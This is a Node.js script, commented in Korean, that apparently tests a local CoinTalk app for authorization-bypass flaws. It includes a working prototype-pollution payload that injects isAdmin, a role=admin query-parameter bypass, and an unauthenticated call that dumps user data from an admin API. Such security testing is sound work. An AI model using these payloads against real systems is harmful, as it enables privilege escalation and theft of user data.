const axios = require('axios');

// CoinTalk 프로젝트의 권한 우회 취약점 테스트

const BASE_URL = 'http://localhost:5000';

async function testAuthBypass() {
  console.log('🔍 CoinTalk 권한 우회 취약점 테스트 시작...\n');
  
  try {
    // 1. 일반 사용자로 로그인 (기존 계정 사용)
    console.log('1. 일반 사용자 로그인...');
    
    // 기존 일반 사용자 계정으로 로그인 시도
    const loginResponse = await axios.post(`${BASE_URL}/api/users/login`, {
      email: 'bitcoin@example.com',
      password: 'BitcoinMoon$'
    });
    
    const token = loginResponse.data.token;
    console.log('✅ 로그인 성공, JWT 토큰 획득\n');
    
    // 2. 정상적인 관리자 API 접근 시도 (실패해야 함)
    console.log('2. 정상적인 관리자 API 접근 시도...');
    try {
      await axios.get(`${BASE_URL}/api/admin/users`, {
        headers: { Authorization: `Bearer ${token}` }
      });
      console.log('❌ 예상과 다름: 관리자 권한 없이 접근 성공');
    } catch (error) {
      console.log('✅ 예상대로 권한 없음으로 접근 거부됨');
    }
    
    // 3. Query Parameter를 통한 권한 우회 시도
    console.log('\n3. Query Parameter 권한 우회 시도...');
    
    // 백엔드 코드에서 unsafeIsAdmin을 사용하는 엔드포인트를 찾거나 만들어야 함
    // 임시로 settings 엔드포인트를 테스트 (Prototype Pollution과 함께)
    
    // 3-1. Prototype Pollution을 통한 권한 상승 시도
    console.log('3-1. Prototype Pollution을 통한 isAdmin 속성 주입...');
    const pollutionPayload = {
      settings: {
        "__proto__": {
          "isAdmin": true
        }
      }
    };
    
    const pollutionResponse = await axios.post(`${BASE_URL}/api/settings/preferences`, pollutionPayload, {
      headers: { Authorization: `Bearer ${token}` }
    });
    
    console.log('✅ Prototype Pollution 페이로드 전송 완료');
    
    // 3-2. 이제 global-settings에 접근 시도 (isAdmin 속성으로 우회)
    console.log('3-2. 오염된 프로토타입을 이용한 관리자 기능 접근...');
    try {
      const globalSettingsResponse = await axios.post(`${BASE_URL}/api/settings/global-settings`, {
        key: 'test_setting',
        value: 'hacked_value'
      }, {
        headers: { Authorization: `Bearer ${token}` }
      });
      
      console.log('🚨 권한 우회 성공!');
      console.log('응답:', globalSettingsResponse.data);
      
    } catch (error) {
      console.log('권한 우회 실패:', error.response?.data?.message || error.message);
    }
    
    // 4. 다른 방법: role 파라미터를 통한 직접 우회 시도
    console.log('\n4. role 파라미터를 통한 직접 우회 시도...');
    try {
      const roleBypassResponse = await axios.post(`${BASE_URL}/api/settings/global-settings?role=admin`, {
        key: 'another_test',
        value: 'bypassed_value'
      }, {
        headers: { Authorization: `Bearer ${token}` }
      });
      
      console.log('🚨 role 파라미터 우회 성공!');
      console.log('응답:', roleBypassResponse.data);
      
    } catch (error) {
      console.log('role 파라미터 우회 실패:', error.response?.data?.message || error.message);
    }
    
    // 5. Admin API 직접 접근 시도 (인증 없이)
    console.log('\n5. Admin API 직접 접근 시도 (포트 3001)...');
    try {
      const adminApiResponse = await axios.get('http://localhost:3001/api/admin/users');
      console.log('🚨 Admin API 인증 우회 성공!');
      console.log('획득한 사용자 정보:', adminApiResponse.data.data?.slice(0, 2)); // 처음 2개만 출력
      
    } catch (error) {
      console.log('Admin API 접근 실패:', error.message);
    }
    
  } catch (error) {
    console.error('테스트 중 오류 발생:', error.response?.data || error.message);
  }
}

// 테스트 실행
testAuthBypass().then(() => {
  console.log('\n🔍 테스트 완료');
}).catch(err => {
  console.error('테스트 실행 오류:', err);
});
